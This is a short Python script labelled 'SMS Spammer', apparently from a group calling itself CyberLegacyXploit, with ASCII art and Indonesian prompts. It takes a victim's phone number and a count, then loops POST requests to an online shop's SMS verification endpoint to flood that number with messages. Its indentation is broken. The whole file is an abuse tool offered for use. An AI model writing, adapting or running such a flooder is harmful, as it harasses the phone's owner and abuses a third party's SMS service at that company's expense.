# spam.py - Spammer SMS
# CyberLegacyXploit

import sys
import time
import requests

tes= """
 ____________ 
< SMS Spammer >
 ------------ 
   \         ,        ,
    \       /( Kizuka )\
     \      \ \___   / |
            /- _  `-/  '
           (/\/ \ \   /\
           / /   | `    \
           X X   ) /    |
           `-^--'`<     '
          (_.)  _  )   /
           `.___/`    /
             `-----' /
<----.     __ / __   \  
<----|====O)))==) \) /====
<----'    `--' `.__,' \
             |        |
              \       /
        ______( (_  / \______
      ,'  ,-----'   |        \
      `--{__________)        \/
	  """
print tes
	phone_number = raw_input("Nomer HP : ")
	countx = raw_input("Jumlah : ")
	countx = int(countx)
	param = {'phone':''+phone_number,'smsType':'1'}
	count = 0
	while (count < countx):
		r = requests.post('http://sc.jd.id/phone/sendPhoneSms', data=param)
		if '"success":true' in r.text:
			print("Terkirim^^")
		else:
			print("Gagal Mengirim :( ")
		time.sleep(1)
		count = count + 1
	print("Succesful!!")
	sys.exit
